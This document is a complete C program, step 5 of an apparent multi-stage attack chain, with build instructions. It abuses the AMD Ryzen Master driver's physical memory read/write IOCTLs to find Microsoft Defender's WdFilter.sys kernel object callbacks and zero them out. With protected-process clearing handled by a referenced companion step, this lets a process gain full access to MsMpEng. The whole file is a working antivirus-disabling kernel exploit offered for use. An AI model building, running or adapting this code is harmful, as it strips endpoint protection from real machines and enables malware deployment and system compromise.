/*
 * step5_wdfilter_disable.c — Disable WdFilter ObRegisterCallbacks
 *
 * WdFilter.sys registers ObCallbacks for PsProcessType that block OpenProcess
 * to MsMpEng even after EPROCESS.Protection is cleared.
 *
 * Attack chain:
 *   1. Find ntoskrnl PA (2MB NtBuildNumber scan)
 *   2. Find PsProcessType RVA → read OBJECT_TYPE kernel VA from ntoskrnl .data
 *   3. Get WdFilter.sys VA range from module list
 *   4. Scan physical pages for _CALLBACK_ENTRY_ITEM:
 *        [+0x000] Flink   = kernel VA
 *        [+0x008] Blink   = kernel VA
 *        [+0x010] Ops     = 1/2/3
 *        [+0x018] Entry*  = kernel VA
 *        [+0x020] ObjType = PsProcessType VA   ← key identifier
 *        [+0x028] PreOp   = VA within WdFilter  ← target
 *        [+0x030] PostOp  = VA within WdFilter or NULL
 *   5. Zero PreOp + PostOp → ObpCallPreOperationCallbacks skips NULL entries
 *
 * Build:
 *   x86_64-w64-mingw32-gcc -O2 -o step5_wdfilter_disable.exe \
 *       step5_wdfilter_disable.c -lkernel32 -ladvapi32
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winternl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* ── Driver ─────────────────────────────────────────────────────────────── */
#define DEVICE_NAME      L"\\\\.\\AMDRyzenMasterDriverV20"
#define IOCTL_PHYS_READ  0x81112F08u
#define IOCTL_PHYS_WRITE 0x81112F0Cu

static HANDLE g_dev = INVALID_HANDLE_VALUE;

/* ── Physical ranges ─────────────────────────────────────────────────────── */
#define MAX_RANGES 64
typedef struct { uint64_t base, size; } PhysRange;
static PhysRange g_ranges[MAX_RANGES];
static int       g_nranges = 0;

static void load_ranges(void)
{
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "HARDWARE\\RESOURCEMAP\\System Resources\\Physical Memory",
        0, KEY_READ, &hKey) != ERROR_SUCCESS) return;
    char vname[256]; DWORD vn, vd, type;
    uint8_t *buf = NULL; DWORD sz = 0;
    for (DWORD i=0;;i++) {
        vn=sizeof vname; vd=0;
        if (RegEnumValueA(hKey,i,vname,&vn,NULL,&type,NULL,&vd)==ERROR_NO_MORE_ITEMS) break;
        if ((type!=3&&type!=8)||vd<20) continue;
        buf=(uint8_t*)malloc(vd); if (!buf) continue;
        if (RegQueryValueExA(hKey,vname,NULL,NULL,buf,&vd)==ERROR_SUCCESS){sz=vd;break;}
        free(buf); buf=NULL;
    }
    RegCloseKey(hKey);
    if (!buf||sz<20){free(buf);return;}
    DWORD cnt=*(DWORD*)(buf+16); uint8_t *p=buf+20;
    for (DWORD i=0;i<cnt&&g_nranges<MAX_RANGES;i++,p+=20){
        if (p+20>buf+sz||p[0]!=3) continue;
        g_ranges[g_nranges].base=*(uint64_t*)(p+4);
        g_ranges[g_nranges].size=*(uint64_t*)(p+12);
        g_nranges++;
    }
    free(buf);
}

static int pa_in_range(uint64_t pa, uint32_t sz)
{
    for (int i=0;i<g_nranges;i++)
        if (pa>=g_ranges[i].base && pa+sz<=g_ranges[i].base+g_ranges[i].size)
            return 1;
    return 0;
}

static int phys_read(uint64_t pa, void *buf, uint32_t sz)
{
    struct { uint64_t pa; uint32_t sz; } in = {pa, sz};
    uint32_t out_sz = 12+sz;
    uint8_t *out = (uint8_t*)calloc(1, out_sz); if (!out) return 0;
    DWORD got=0;
    BOOL ok = DeviceIoControl(g_dev, IOCTL_PHYS_READ,
                              &in, sizeof(in), out, out_sz, &got, NULL);
    if (ok && got>=12) memcpy(buf, out+12, sz);
    free(out); return ok && got>=12;
}

static int phys_write(uint64_t pa, const void *data, uint32_t sz)
{
    if (!pa_in_range(pa, sz)) return 0;
    uint32_t in_sz = 12+sz;
    uint8_t *in_buf = (uint8_t*)malloc(in_sz); if (!in_buf) return 0;
    *(uint64_t*)(in_buf) = pa; *(uint32_t*)(in_buf+8) = sz;
    memcpy(in_buf+12, data, sz);
    DWORD got=0;
    BOOL ok = DeviceIoControl(g_dev, IOCTL_PHYS_WRITE,
                              in_buf, in_sz, NULL, 0, &got, NULL);
    free(in_buf); return ok;
}

/* ── NtQSI module list ────────────────────────────────────────────────────
 * _RTL_PROCESS_MODULE_INFORMATION (one entry):
 *   +0x00 HANDLE  Section
 *   +0x08 PVOID   MappedBase
 *   +0x10 PVOID   ImageBase      ← kernel VA of loaded module
 *   +0x18 ULONG   ImageSize
 *   +0x1C ULONG   Flags
 *   +0x20 USHORT  LoadOrderIndex
 *   +0x22 USHORT  InitOrderIndex
 *   +0x24 USHORT  LoadCount
 *   +0x26 USHORT  OffsetToFileName
 *   +0x28 CHAR    FullPathName[256]
 * Each entry = 0x128 bytes.
 */
#define MOD_ENTRY_SZ 0x128
typedef struct {
    HANDLE  Section;         /* +0x00 */
    PVOID   MappedBase;      /* +0x08 */
    PVOID   ImageBase;       /* +0x10 */
    ULONG   ImageSize;       /* +0x18 */
    ULONG   Flags;           /* +0x1C */
    USHORT  LoadOrderIndex;  /* +0x20 */
    USHORT  InitOrderIndex;  /* +0x22 */
    USHORT  LoadCount;       /* +0x24 */
    USHORT  OffsetToFileName;/* +0x26 */
    CHAR    FullPathName[256];/* +0x28 */
} MOD_ENTRY;

typedef struct {
    ULONG      NumberOfModules;
    MOD_ENTRY  Modules[1];
} MOD_LIST;

typedef NTSTATUS (NTAPI *PFN_NTQSI)(ULONG,PVOID,ULONG,PULONG);

static MOD_LIST *get_module_list(void)
{
    PFN_NTQSI fn = (PFN_NTQSI)GetProcAddress(
        GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");
    if (!fn) return NULL;
    ULONG sz = 0x80000;
    MOD_LIST *ml = NULL;
    NTSTATUS st;
    do {
        free(ml);
        ml = (MOD_LIST*)malloc(sz *= 2);
        st = fn(11, ml, sz, NULL);
    } while (st == (NTSTATUS)0xC0000004L);
    if (st) { free(ml); return NULL; }
    return ml;
}

/* ── ntoskrnl VA (always first entry in module list) ─────────────────────── */
static uint64_t get_ntoskrnl_va(char *path_out)
{
    MOD_LIST *ml = get_module_list();
    if (!ml) return 0;
    uint64_t va = (uint64_t)ml->Modules[0].ImageBase;
    if (path_out) {
        GetWindowsDirectoryA(path_out, MAX_PATH);
        strcat_s(path_out, MAX_PATH, "\\system32\\ntoskrnl.exe");
    }
    free(ml);
    return va;
}

/* ── Get WdFilter VA range ────────────────────────────────────────────────── */
static int get_wdfilter_range(uint64_t *base_out, uint64_t *size_out)
{
    MOD_LIST *ml = get_module_list();
    if (!ml) return 0;
    for (ULONG i = 0; i < ml->NumberOfModules; i++) {
        char *name = ml->Modules[i].FullPathName
                   + ml->Modules[i].OffsetToFileName;
        if (_stricmp(name, "WdFilter.sys") == 0) {
            *base_out = (uint64_t)ml->Modules[i].ImageBase;
            *size_out = ml->Modules[i].ImageSize;
            free(ml);
            return 1;
        }
    }
    free(ml); return 0;
}

/* ── PE export RVA lookup ─────────────────────────────────────────────────── */
static uint32_t pe_export_rva(const uint8_t *pe, size_t fsz, const char *sym)
{
    if (fsz<0x100||pe[0]!='M'||pe[1]!='Z') return 0;
    int32_t elf=*(int32_t*)(pe+0x3C);
    uint16_t ns=*(uint16_t*)(pe+elf+6), osz=*(uint16_t*)(pe+elf+20);
    uint32_t sb=(uint32_t)elf+24+osz;

    #define R2F(rva,fo) do{(fo)=0;\
        for(uint16_t _i=0;_i<ns;_i++){\
            uint32_t _s=sb+_i*40,_va=*(uint32_t*)(pe+_s+12);\
            uint32_t _vsz=*(uint32_t*)(pe+_s+16);if(!_vsz)_vsz=*(uint32_t*)(pe+_s+24);\
            uint32_t _fo=*(uint32_t*)(pe+_s+20);\
            if((rva)>=_va&&(rva)<_va+_vsz){(fo)=_fo+((rva)-_va);break;}}\
    }while(0)

    uint32_t erva=*(uint32_t*)(pe+elf+0x88),efo=0; R2F(erva,efo);
    if (!efo||efo+40>fsz) return 0;
    const uint8_t *exp=pe+efo;
    uint32_t nn=*(uint32_t*)(exp+0x18);
    uint32_t rfn=*(uint32_t*)(exp+0x1C),rnm=*(uint32_t*)(exp+0x20),rod=*(uint32_t*)(exp+0x24);
    uint32_t ffn=0,fnm=0,fod=0; R2F(rfn,ffn); R2F(rnm,fnm); R2F(rod,fod);
    if (!ffn||!fnm||!fod) return 0;
    for (uint32_t i=0;i<nn;i++){
        uint32_t nrva=*(uint32_t*)(pe+fnm+i*4),nfo=0; R2F(nrva,nfo);
        if (!nfo||nfo>=fsz) continue;
        if (strcmp((char*)(pe+nfo),sym)==0){
            uint16_t ord=*(uint16_t*)(pe+fod+i*2);
            return *(uint32_t*)(pe+ffn+ord*4);
        }
    }
    #undef R2F
    return 0;
}

/* ── Find ntoskrnl PA via 2MB NtBuildNumber scan ─────────────────────────── */
static uint64_t find_ntoskrnl_pa(const char *path, uint64_t nt_va)
{
    HANDLE hf = CreateFileA(path,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,0,NULL);
    if (hf==INVALID_HANDLE_VALUE) return 0;
    DWORD fsz = GetFileSize(hf,NULL);
    uint8_t *pe = (uint8_t*)malloc(fsz);
    DWORD rd=0; ReadFile(hf,pe,fsz,&rd,NULL); CloseHandle(hf);

    uint32_t rva = pe_export_rva(pe, fsz, "NtBuildNumber");
    free(pe);
    if (!rva) return 0;

    uint32_t ssd = *(uint32_t*)(0x7FFE0000+0x260) & 0xFFFF;
    uint32_t c0=ssd, c1=ssd|0xF0000000, c2=ssd|0xC0000000;

    const uint64_t STEP = 0x200000ULL;
    for (int ri=0;ri<g_nranges;ri++){
        uint64_t base=(g_ranges[ri].base+STEP-1)&~(STEP-1);
        uint64_t end=g_ranges[ri].base+g_ranges[ri].size;
        for (uint64_t pa=base;pa<end;pa+=STEP){
            if (!pa_in_range(pa+rva,4)) continue;
            uint32_t val=0;
            if (!phys_read(pa+rva,&val,4)) continue;
            if (val!=c0&&val!=c1&&val!=c2) continue;
            uint16_t mz=0; phys_read(pa,&mz,2);
            if (mz==0x5A4D) {
                printf("    ntoskrnl PA=0x%016llX  (NtBuildNumber=0x%08X)\n",
                       (unsigned long long)pa, val);
                return pa;
            }
        }
    }
    return 0;
}

/* ── Scan and patch WdFilter ObCallback entries ────────────────────────────
 * CALLBACK_ENTRY_ITEM layout (Win10 19041-19044 x64):
 *   +0x000  LIST_ENTRY.Flink   — in OBJECT_TYPE.CallbackList
 *   +0x008  LIST_ENTRY.Blink
 *   +0x010  ULONG  Operations  (1=OB_OPERATION_HANDLE_CREATE,
 *                               2=OB_OPERATION_HANDLE_DUPLICATE, 3=both)
 *   +0x014  ULONG  _padding
 *   +0x018  PVOID  CallbackEntry  -> _CALLBACK_ENTRY (contains Enabled flag)
 *   +0x020  PVOID  ObjectType     -> _OBJECT_TYPE == PsProcessType VA
 *   +0x028  PVOID  PreOperation   -> function in WdFilter  ← ZERO THIS
 *   +0x030  PVOID  PostOperation  -> function in WdFilter or NULL ← ZERO THIS
 */
#define SCAN_CHUNK5 0x10000  /* 64KB per IOCTL — 16x speedup vs 4KB */
static uint8_t g_chunk5[SCAN_CHUNK5];

static int scan_patch_callbacks(uint64_t objtype_va,
                                uint64_t wdf_base, uint64_t wdf_size)
{
    int patched = 0;
    uint64_t last_prog = 0;
    printf("    Scanning physical memory (64KB chunks)...\n");

    for (int ri = 0; ri < g_nranges; ri++) {
        uint64_t end = g_ranges[ri].base + g_ranges[ri].size;
        for (uint64_t chunk_pa = g_ranges[ri].base; chunk_pa < end; chunk_pa += SCAN_CHUNK5) {
            if (chunk_pa - last_prog >= 0x40000000ULL) {
                printf("    [ %5llu MB ]\n", (unsigned long long)(chunk_pa>>20));
                last_prog = chunk_pa;
            }
            uint64_t csz = end - chunk_pa;
            if (csz > SCAN_CHUNK5) csz = SCAN_CHUNK5;
            if (!phys_read(chunk_pa, g_chunk5, (uint32_t)csz)) continue;

            /* Scan for objtype_va at offset +0x020 within a CALLBACK_ENTRY_ITEM.
             * Entry must be fully within the chunk (38 bytes total: off-0x20..off+0x18). */
            for (uint64_t off = 0x20; off + 0x18 <= csz; off += 8) {
                uint64_t candidate = *(uint64_t*)(g_chunk5 + off);
                if (candidate != objtype_va) continue;

                if (off < 0x20 || off + 0x18 > csz) continue;

                uint64_t flink  = *(uint64_t*)(g_chunk5 + off - 0x20);
                uint64_t blink  = *(uint64_t*)(g_chunk5 + off - 0x18);
                uint32_t ops    = *(uint32_t*)(g_chunk5 + off - 0x10);
                uint64_t cbent  = *(uint64_t*)(g_chunk5 + off - 0x08);
                uint64_t preop  = *(uint64_t*)(g_chunk5 + off + 0x08);
                uint64_t postop = *(uint64_t*)(g_chunk5 + off + 0x10);

                /* Validate list entry and operations */
                if (flink < 0xFFFF800000000000ULL) continue;
                if (blink < 0xFFFF800000000000ULL) continue;
                if (ops < 1 || ops > 3) continue;
                if (cbent < 0xFFFF800000000000ULL) continue;

                /* At least one of PreOp/PostOp must be in WdFilter range */
                int pre_wdf  = (preop  >= wdf_base && preop  < wdf_base+wdf_size);
                int post_wdf = (postop >= wdf_base && postop < wdf_base+wdf_size);
                if (!pre_wdf && !post_wdf) continue;

                uint64_t entry_pa = chunk_pa + (off - 0x20);
                printf("\n    [FOUND] CALLBACK_ENTRY_ITEM PA=0x%016llX\n",
                       (unsigned long long)entry_pa);
                printf("            Flink=0x%016llX  Blink=0x%016llX\n",
                       (unsigned long long)flink, (unsigned long long)blink);
                printf("            Ops=%u  PreOp=0x%016llX  PostOp=0x%016llX\n",
                       ops,
                       (unsigned long long)preop,
                       (unsigned long long)postop);

                /* Zero PreOperation */
                if (pre_wdf) {
                    uint64_t z = 0;
                    uint64_t preop_pa = entry_pa + 0x28;
                    if (phys_write(preop_pa, &z, 8)) {
                        printf("            Zeroed PreOperation  (PA=0x%016llX)\n",
                               (unsigned long long)preop_pa);
                        patched++;
                    } else {
                        printf("            [!] phys_write PreOp FAILED\n");
                    }
                }

                /* Zero PostOperation */
                if (post_wdf) {
                    uint64_t z = 0;
                    uint64_t postop_pa = entry_pa + 0x30;
                    if (phys_write(postop_pa, &z, 8)) {
                        printf("            Zeroed PostOperation (PA=0x%016llX)\n",
                               (unsigned long long)postop_pa);
                    }
                }
            }
        }
    }
    return patched;
}

/* ════════════════════════════════════════════════════════════════════════ */
int main(void)
{
    printf("=== Step 5: WdFilter ObCallback Disable ===\n\n");

    g_dev = CreateFileW(DEVICE_NAME, GENERIC_READ|GENERIC_WRITE,
                        0, NULL, OPEN_EXISTING, 0, NULL);
    if (g_dev == INVALID_HANDLE_VALUE) {
        printf("[-] Cannot open device: %lu\n", GetLastError()); return 1;
    }
    printf("[+] Device opened\n\n");

    load_ranges();
    printf("[1] Physical ranges: %d\n\n", g_nranges);

    /* ── 1. ntoskrnl VA + path ─────────────────────────────────────────── */
    char nt_path[MAX_PATH] = {0};
    uint64_t nt_va = get_ntoskrnl_va(nt_path);
    printf("[2] ntoskrnl VA=0x%016llX\n    Path=%s\n\n",
           (unsigned long long)nt_va, nt_path);

    /* ── 2. ntoskrnl PA ───────────────────────────────────────────────── */
    printf("[3] Finding ntoskrnl PA (2MB scan)...\n");
    uint64_t nt_pa = find_ntoskrnl_pa(nt_path, nt_va);
    if (!nt_pa) {
        printf("[-] ntoskrnl PA not found\n"); CloseHandle(g_dev); return 1;
    }
    printf("\n");

    /* ── 3. PsProcessType → OBJECT_TYPE VA ──────────────────────────────
     * PsProcessType is an exported OBJECT_TYPE** in ntoskrnl .data section.
     * Since ntoskrnl image pages have contiguous VA↔PA:
     *   PA(PsProcessType) = nt_pa + RVA
     * phys_read(PA) gives the OBJECT_TYPE* kernel VA.
     * ───────────────────────────────────────────────────────────────────── */
    printf("[4] Finding PsProcessType...\n");
    HANDLE hf = CreateFileA(nt_path,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,0,NULL);
    if (hf==INVALID_HANDLE_VALUE) { printf("[-] Cannot open ntoskrnl\n"); return 1; }
    DWORD fsz = GetFileSize(hf, NULL);
    uint8_t *pe_buf = (uint8_t*)malloc(fsz);
    DWORD rd=0; ReadFile(hf,pe_buf,fsz,&rd,NULL); CloseHandle(hf);

    uint32_t pst_rva = pe_export_rva(pe_buf, fsz, "PsProcessType");
    free(pe_buf);
    if (!pst_rva) {
        printf("[-] PsProcessType RVA not found\n"); CloseHandle(g_dev); return 1;
    }
    printf("    PsProcessType RVA=0x%08X\n", pst_rva);

    uint64_t pst_pa = nt_pa + pst_rva;
    printf("    PsProcessType PA =0x%016llX\n", (unsigned long long)pst_pa);

    uint64_t objtype_va = 0;
    if (!phys_read(pst_pa, &objtype_va, 8) || !objtype_va) {
        printf("[-] Failed to read PsProcessType value\n");
        CloseHandle(g_dev); return 1;
    }
    printf("    OBJECT_TYPE VA   =0x%016llX\n\n", (unsigned long long)objtype_va);

    /* ── 4. WdFilter VA range ────────────────────────────────────────────── */
    printf("[5] Finding WdFilter.sys module range...\n");
    uint64_t wdf_base = 0, wdf_size = 0;
    if (!get_wdfilter_range(&wdf_base, &wdf_size)) {
        printf("[-] WdFilter.sys not found in module list\n");
        CloseHandle(g_dev); return 1;
    }
    printf("    WdFilter base=0x%016llX  size=0x%X\n\n",
           (unsigned long long)wdf_base, (unsigned)wdf_size);

    /* ── 5. Scan + patch CALLBACK_ENTRY_ITEM ─────────────────────────────── */
    printf("[6] Scanning for WdFilter CALLBACK_ENTRY_ITEM...\n");
    printf("    Looking for ObjectType=0x%016llX  PreOp in WdFilter range\n\n",
           (unsigned long long)objtype_va);

    int n = scan_patch_callbacks(objtype_va, wdf_base, wdf_size);

    if (n == 0) {
        printf("\n[-] No WdFilter callback entries found\n");
        printf("    Possible causes:\n");
        printf("    - WdFilter uses a different structure layout (rare)\n");
        printf("    - MsMpEng not running / WdFilter not active\n");
        CloseHandle(g_dev); return 1;
    }

    printf("\n[+] Patched %d callback PreOperation pointer(s)\n\n", n);

    /* ── 6. Verify: try OpenProcess on MsMpEng ──────────────────────────── */
    printf("[7] Verifying — OpenProcess(MsMpEng, PROCESS_ALL_ACCESS)...\n");
    printf("    Run step4_ppl_bypass.exe MsMpEng.exe now.\n");
    printf("    (step4 still needs to clear EPROCESS.Protection separately)\n\n");

    printf("Done. WdFilter callbacks disabled.\n");
    CloseHandle(g_dev);
    return 0;
}
